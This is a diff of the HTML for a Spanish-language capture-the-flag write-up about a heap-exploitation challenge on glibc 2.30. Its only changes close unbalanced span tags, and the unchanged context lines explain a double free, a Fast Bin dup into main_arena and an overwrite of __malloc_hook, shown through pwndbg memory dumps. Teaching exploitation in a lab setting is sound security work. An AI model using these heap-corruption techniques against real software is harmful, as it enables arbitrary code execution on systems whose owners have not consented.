@@ -11,7 +11,7 @@ RELRO:    <span class="code-dark-green">Full RELRO</span>
 Stack:    <span class="code-dark-green">Canary found</span>
 NX:       <span class="code-dark-green">NX enabled</span>
 PIE:      <span class="code-dark-green">PIE enabled</span>
-RUNPATH:  <span class="code-dark-red">b'./glibc/'
+RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
 </code></pre></div><p>Además, tenemos esta versión de Glibc:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">glibc/ld-linux-x86-64.so.2</span> <span class="mtku">glibc/libc.so.6</span>
 GNU C Library (GNU libc) stable release version 2.30.
 Copyright (C) 2019 Free Software Foundation, Inc.
@@ -130,7 +130,7 @@ Program received signal SIGINT, Interrupt.
 <span class="code-white">🀄              🀄</span>
 <span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
 
-<span class="code-white">&gt;&gt; <span class="code-red">$</span>
+<span class="code-white">&gt;&gt; <span class="code-red">$</span></span>
 </code></pre></div><p>Entonces, vamos a la siguiente etapa. Tenemos dos opciones:</p><ul><li><em>Summon</em>: Asignar memoria dinámica usando <code>malloc</code> y escribir datos en el <em>chunk</em> asignado (no hay desbordamientos).</li><li><em>Release</em>: Liberar <em>chunks</em>.</li></ul><p>Hay algunas limitaciones. Podemos asignar <em>chunks</em> de tamaño <code>0</code> a <code>0x58</code> y de <code>0x69</code> a <code>0x78</code> (límites incluidos). Este hecho es muy importante para la explotación (complica mucho el <em>exploit</em>).</p><p>Los <em>chunks</em> se almacenan en una lista global. Otra limitación es que solo podemos asignar hasta 13 <em>chunks</em>. Además, la opción <code>2</code> no elimina la dirección del <em>chunk</em> cuando se libera. Por un lado, esto es bueno porque podemos explotar potencialmente una vulnerabilidad de <em>double free</em>, que puede aprovecharse para <em>Use After Free</em>. Por otro lado, esto es malo porque solo tenemos 13 asignaciones en total.</p><h2 id="estrategia-de-explotación">Estrategia de explotación</h2><p>Es muy fácil explotar el error de <em>double free</em> y lograr <em>Use After Free</em>, solo necesitamos asignar dos <em>chunks</em> (digamos <code>A</code> y <code>B</code>). Entonces, podemos liberar <code>A</code>, luego <code>B</code> y luego <code>A</code> nuevamente. Esto es necesario para evitar una comprobación de seguridad de Glibc (¿por qué se llama comprobación de seguridad?).</p><p>Luego, al asignar un nuevo <em>chunk</em> del mismo tamaño, tendremos un <em>chunk</em> en la posición de <code>A</code>, pero con <code>A</code> en la correspondiente lista de <em>Fast Bin</em> (se almacena en <em>Fast Bin</em> porque su tamaño es menor que <code>0x80</code>). Entonces, podemos modificar el puntero <code>fd</code> de <code>A</code>, de modo que corromperemos la lista enlazada y lograremos una primitiva de escritura (con algunas limitaciones) después de asignar <code>B</code> y <code>A</code>.</p><p>Podemos probar esto fácilmente en GDB:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">da</span>
 Reading symbols from <span class="code-dark-green">da</span>...
 (No debugging symbols found in <span class="code-dark-green">da</span>)
@@ -413,11 +413,11 @@ Program received signal SIGSEGV, Segmentation fault.
 <span class="code-white">🀄              🀄</span>
 <span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
 
-<span class="code-white">&gt;&gt; <span class="code-red">$</span>
+<span class="code-white">&gt;&gt; <span class="code-red">$</span></span>
 </code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>vis_heap_chunks
 
 ...
-</span>0x557f61bd6420  <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-green">0x0000000000000051</span>      <span class="code-dark-green">........Q.......</span>         &lt;-- fastbins[0x50][0], fastbins[0x50][0]
+0x557f61bd6420  <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-green">0x0000000000000051</span>      <span class="code-dark-green">........Q.......</span>         &lt;-- fastbins[0x50][0], fastbins[0x50][0]
 0x557f61bd6430  <span class="code-dark-green">0x0000557f61bd6470</span>      <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">pd.a.U..........</span>
 0x557f61bd6440  <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">................</span>
 0x557f61bd6450  <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">................</span>
@@ -472,7 +472,7 @@ $6 = {
 <span class="code-dark-blue">smallbins</span>
 <span class="code-dark-yellow">empty</span>
 <span class="code-dark-blue">largebins</span>
-<span class="code-dark-yellow">empty
+<span class="code-dark-yellow">empty</span>
 </code></pre></div><p>Como se puede ver, tenemos algunas direcciones del <em>heap</em> en <code>main_arena</code> (cabezas de <code>0x30</code> y <code>0x50</code> de los <em>Fast Bin</em> y la dirección del <em>top chunk</em> <code>0x0000557f61bd64f0</code>).</p><p>Obsérvese también que hemos comenzado la técnica <em>Fast Bin dup</em> porque ya tenemos un <em>double free</em> en el <em>Fast Bin</em> de tamaño <code>0x50</code>. Ahora la idea es asignar un <em>chunk</em> de tamaño <code>0x50</code> en <code>main_arena</code> (específicamente, en la posición de la dirección del <em>chunk</em> de <code>0x30</code>).</p><p>Esta parte era obligatoria, porque no había otra área de memoria útil donde pudiéramos usar <em>Fast Bin dup</em>. Podríamos haber elegido otra lista de <em>Fast Bin</em>, pero la elegida funciona correctamente. Mi idea era modificar la dirección del <em>top chunk</em> a una dirección anterior a <code>__malloc_hook</code>, para que podamos comenzar a asignar <em>chunks</em> hasta que caer cerca de <code>__malloc_hook</code> y escribir algo aquí para obtener ejecución de comandos.</p><p>Para esto, necesitamos alinear un poco la memoria para tomar el <em>offset</em> para el ataque de <em>Fast Bin dup</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>x/20gx 0x7f365b0c9b60 + 21
 <span class="code-dark-blue">0x7f365b0c9b75</span> &lt;<span class="code-dark-yellow">main_arena</span>+21&gt;: 0x7f61bd64c0000000      0x0000000000000055
 <span class="code-dark-blue">0x7f365b0c9b85</span> &lt;<span class="code-dark-yellow">main_arena</span>+37&gt;: 0x7f61bd6420000000      0x0000000000000055
@@ -517,7 +517,7 @@ $6 = {
 <span class="code-white">🀄              🀄</span>
 <span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
 
-<span class="code-white">&gt;&gt; <span class="code-red">$</span>
+<span class="code-white">&gt;&gt; <span class="code-red">$</span></span>
 </code></pre></div><p>Y aquí tenemos la estructura corrupta de <code>main_arena</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>p/x main_arena
 $1 = {
   mutex = 0x0,
@@ -630,7 +630,7 @@ $1 = {
 <span class="code-white">🀄              🀄</span>
 <span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
 
-<span class="code-white">&gt;&gt; <span class="code-red">$</span>
+<span class="code-white">&gt;&gt; <span class="code-red">$</span></span>
 </code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>x/100gx &__malloc_hook - 70
 <span class="code-dark-blue">0x7fc0032bc920</span> &lt;<span class="code-dark-yellow">_IO_wide_data_1</span>+192&gt;:   0x0000000000000000      0x0000000000000000  
 <span class="code-dark-blue">0x7fc0032bc930</span> &lt;<span class="code-dark-yellow">_IO_wide_data_1</span>+208&gt;:   0x0000000000000000      0x0000000000000000
@@ -712,7 +712,7 @@ $1 = {
 <span class="code-white">🀄              🀄</span>
 <span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
 
-<span class="code-white">&gt;&gt; <span class="code-red">$</span>
+<span class="code-white">&gt;&gt; <span class="code-red">$</span></span>
 </code></pre></div><p>Entonces tenemos este estado de la memoria. Obsérvese que el tamaño del <em>top chunk</em> está por encima de <code>__malloc_hook</code>. Entonces, con la próxima asignación, podremos escribir ahí:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>x/100gx &__malloc_hook - 70
 <span class="code-dark-blue">0x7ff21cf42920</span> &lt;<span class="code-dark-yellow">_IO_wide_data_1</span>+192&gt;:   0x0000000000000000      0x0000000000000000  
 <span class="code-dark-blue">0x7ff21cf42930</span> &lt;<span class="code-dark-yellow">_IO_wide_data_1</span>+208&gt;:   0x0000000000000000      0x0000000000000000
@@ -766,7 +766,7 @@ $1 = {
 <span class="code-dark-blue">0x7ff21cf42c30</span> &lt;<span class="code-dark-yellow">main_arena</span>+208&gt;:        0x00007ff21cf42c20      0x00007ff21cf42c20
 <span class="code-red">pwndbg&gt; </span>continue
 Continuing.
-</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-white">&gt;&gt; <span class="code-red">$</span> 1
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-white">&gt;&gt;</span> <span class="code-red">$</span> 1
 
 Dragon's length: <span class="code-red">$</span> 56
 
@@ -784,7 +784,7 @@ Name your dragon: <span class="code-red">$</span> AAAAAAAABBBBBBBBCCCCCCCC
 <span class="code-white">🀄              🀄</span>
 <span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
 
-<span class="code-white">&gt;&gt; <span class="code-red">$
+<span class="code-white">&gt;&gt; <span class="code-red">$</span></span>
 </code></pre></div><p>Y tenemos control sobre <code>__malloc_hook</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>x/10gx &__malloc_hook - 4
 <span class="code-dark-blue">0x7ff21cf42b30</span> &lt;<span class="code-dark-yellow">_IO_wide_data_0</span>+240&gt;:   0x00007ff21cf3eee0      0x0000000000000041  
 <span class="code-dark-blue">0x7ff21cf42b40</span> &lt;<span class="code-dark-yellow">__memalign_hook</span>&gt;:       0x4141414141414141      0x4242424242424242
